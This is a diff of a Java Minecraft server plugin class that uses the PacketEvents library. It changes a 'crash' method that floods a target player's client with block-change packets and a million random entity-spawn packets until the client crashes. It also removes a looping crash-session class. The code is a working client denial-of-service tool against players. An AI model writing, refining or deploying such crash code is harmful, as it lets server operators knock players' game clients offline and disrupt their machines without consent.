@@ -18,8 +18,8 @@ import com.google.common.collect.Lists;
 import io.github.retrooper.packetevents.util.SpigotConversionUtil;
 import lombok.AccessLevel;
 import lombok.Getter;
-import lombok.Setter;
 import net.dehasher.hlib.Colors;
+import net.dehasher.hlib.Scheduler;
 import net.dehasher.hlib.Tools;
 import net.dehasher.hlib.data.NMS;
 import org.bukkit.*;
@@ -27,21 +27,15 @@ import org.bukkit.entity.EntityType;
 import org.bukkit.entity.Player;
 import org.bukkit.inventory.ItemStack;
 import org.bukkit.plugin.Plugin;
-import org.bukkit.scheduler.BukkitTask;
 import java.util.*;
 import java.util.concurrent.ConcurrentHashMap;
-import java.util.concurrent.atomic.AtomicBoolean;
 import java.util.stream.IntStream;
 
 public class PacketEventsHook {
 	@Getter(AccessLevel.PRIVATE)
 	private static final Object listenerLock = new Object();
-	@Getter
-	private static final CrashQueue crashQueue = new CrashQueue();
 	@Getter(AccessLevel.PRIVATE)
 	private static final Map<PacketListenerAbstract, Plugin> listeners = new ConcurrentHashMap<>();
-	@Getter(AccessLevel.PRIVATE)
-	private static final Map<UUID, CrashSession> sessions = new ConcurrentHashMap<>();
 	@Getter(AccessLevel.PRIVATE)
 	private static final List<EntityType> randomEntity = List.of(
 			EntityType.ELDER_GUARDIAN, EntityType.WITHER_SKELETON,
@@ -105,7 +99,6 @@ public class PacketEventsHook {
 			List<PacketListenerAbstract> owned = getListeners().entrySet().stream()
 					.filter(entry -> entry.getValue() == owner).map(Map.Entry::getKey).toList();
 			owned.forEach(PacketEventsHook::unregister);
-			getSessions().values().stream().filter(session -> session.getOwner() == owner).forEach(CrashSession::stop);
 		}
 	}
 
@@ -115,39 +108,30 @@ public class PacketEventsHook {
 
 	public static void shutdown() {
 		synchronized (getListenerLock()) {
-			List.copyOf(getListeners().keySet()).forEach(PacketEventsHook::unregister);
-			getSessions().values().forEach(CrashSession::stop);
-			getCrashQueue().clear();
+			List.copyOf(getListeners().keySet())
+					.forEach(PacketEventsHook::unregister);
 		}
 	}
 
 	public static class Methods {
-		public static void crash(Plugin owner, Player player) {
+		public static void crash(Player player, CrashQueue crashQueue) {
 			if (!Bukkit.isPrimaryThread()) {
-				Bukkit.getScheduler().runTask(owner, () -> crash(owner, player));
+				Scheduler.Bukkit.doSync(() -> crash(player, crashQueue));
 				return;
 			}
-			if (!owner.isEnabled() || !player.isOnline() || Tools.isNPC(player)) return;
-			if (getCrashQueue().getCrashedPlayers().contains(player.getName())) return;
+			if (!player.isOnline() || Tools.isNPC(player)) return;
+			if (crashQueue.getCrashedPlayers().contains(player.getName())) return;
 			Location location = player.getLocation();
 			Vector3d position = new Vector3d(location.getBlockX(), location.getBlockY() - 10, location.getBlockZ());
 			List<Vector3i> sections = ChunkPacket.visibleSections(player);
 			WrappedBlockState block = SpigotConversionUtil.fromBukkitBlockData(Material.END_GATEWAY.createBlockData());
-			CrashSession session = new CrashSession(owner, player, position);
-			if (getSessions().putIfAbsent(player.getUniqueId(), session) != null) return;
-			getCrashQueue().add(player.getName());
-
-			// Бесконечный цикл краша частицами, пока игрок не ливнет.
-			// Крашит спустя 0.3 секунды после выполнения.
-			session.setTask(Bukkit.getScheduler().runTaskAsynchronously(owner, () -> {
-				try {
-					ChunkPacket.sendSections(player, sections, block, session.getActive());
-					session.run();
-				} catch (RuntimeException | Error exception) {
-					session.stop();
-					throw exception;
-				}
-			}));
+			crashQueue.add(player.getName());
+			Scheduler.doAsync(() -> ChunkPacket.sendSections(player, sections, block));
+			Scheduler.doAsyncLater(() -> IntStream.range(0, 1000000)
+					.forEach(_ -> {
+						EntityType type = getRandomEntity().get(Tools.getRandomInt(0, getRandomEntity().size() - 1));
+						sendPacket(player, new WrapperPlayServerSpawnEntity(Tools.getRandomInt(Short.MIN_VALUE, Short.MAX_VALUE), Optional.of(UUID.randomUUID()), SpigotConversionUtil.fromBukkitEntityType(type), position, 0, 0, 0, 0, Optional.empty()));
+					}), 10L);
 		}
 
 		public static Player getPlayer(ProtocolPacketEvent event) {
@@ -212,7 +196,7 @@ public class PacketEventsHook {
 
 		public static void sendVisible(Player player, WrappedBlockState blockData) {
 			if (!Bukkit.isPrimaryThread()) throw new IllegalStateException("Visible chunks must be read on the server thread");
-			sendSections(player, visibleSections(player), blockData, new AtomicBoolean(true));
+			sendSections(player, visibleSections(player), blockData);
 		}
 
 		private static List<Vector3i> visibleSections(Player player) {
@@ -232,11 +216,11 @@ public class PacketEventsHook {
 			return sections;
 		}
 
-		private static void sendSections(Player player, List<Vector3i> sections, WrappedBlockState block, AtomicBoolean active) {
+		private static void sendSections(Player player, List<Vector3i> sections, WrappedBlockState block) {
 			WrapperPlayServerMultiBlockChange.EncodedBlock[] blocks = IntStream.range(0, BLOCKS_PER_SECTION)
 					.mapToObj(index -> new WrapperPlayServerMultiBlockChange.EncodedBlock(block, index >> 8, index & 15, index >> 4 & 15))
 					.toArray(WrapperPlayServerMultiBlockChange.EncodedBlock[]::new);
-			sections.stream().takeWhile(_ -> active.get()).forEach(section ->
+			sections.forEach(section ->
 					getPlugin().getPlayerManager().sendPacketSilently(player, new WrapperPlayServerMultiBlockChange(section, null, blocks)));
 		}
 	}
@@ -269,10 +253,15 @@ public class PacketEventsHook {
 
 	@Getter
 	public static class CrashQueue {
-		private static final int MAX_SIZE = 3;
 		private final Set<String> crashedPlayers = ConcurrentHashMap.newKeySet();
 		@Getter(AccessLevel.PRIVATE)
 		private final LinkedList<String> order = new LinkedList<>();
+		@Getter(AccessLevel.PRIVATE)
+		private final int maxSize;
+
+		public CrashQueue(int maxSize) {
+			this.maxSize = maxSize;
+		}
 
 		public synchronized void remove(String value) {
 			getCrashedPlayers().remove(value);
@@ -286,48 +275,8 @@ public class PacketEventsHook {
 
 		public synchronized void add(String value) {
 			if (getCrashedPlayers().contains(value)) return;
-			if (getCrashedPlayers().size() == MAX_SIZE) getCrashedPlayers().remove(getOrder().removeFirst());
+			if (getCrashedPlayers().size() == getMaxSize()) getCrashedPlayers().remove(getOrder().removeFirst());
 			if (getCrashedPlayers().add(value)) getOrder().add(value);
-		}
-	}
-
-	@Getter(AccessLevel.PRIVATE)
-	private static final class CrashSession implements Runnable {
-		private final Plugin owner;
-		private final Player player;
-		private final UUID playerId;
-		private final Vector3d position;
-		private final AtomicBoolean active = new AtomicBoolean(true);
-		@Setter(AccessLevel.PRIVATE)
-		private volatile BukkitTask task;
-
-		private CrashSession(Plugin owner, Player player, Vector3d position) {
-			this.owner = owner;
-			this.player = player;
-			this.playerId = player.getUniqueId();
-			this.position = position;
-		}
-
-		@Override
-		public void run() {
-			try {
-				IntStream.range(0, 666666).takeWhile(_ -> getActive().get()).forEach(_ -> {
-					EntityType type = getRandomEntity().get(Tools.getRandomInt(0, getRandomEntity().size() - 1));
-					sendPacket(getPlayer(), new WrapperPlayServerSpawnEntity(Tools.getRandomInt(Short.MIN_VALUE, Short.MAX_VALUE), Optional.of(UUID.randomUUID()), SpigotConversionUtil.fromBukkitEntityType(type), getPosition(), 0, 0, 0, 0, Optional.empty()));
-				});
-				synchronized (this) {
-					if (getActive().get()) setTask(Bukkit.getScheduler().runTaskLaterAsynchronously(getOwner(), this, 200L));
-				}
-			} catch (RuntimeException | Error exception) {
-				stop();
-				throw exception;
-			}
-		}
-
-		private synchronized void stop() {
-			getActive().set(false);
-			if (getTask() != null) getTask().cancel();
-			getSessions().remove(getPlayerId(), this);
 		}
 	}
 }
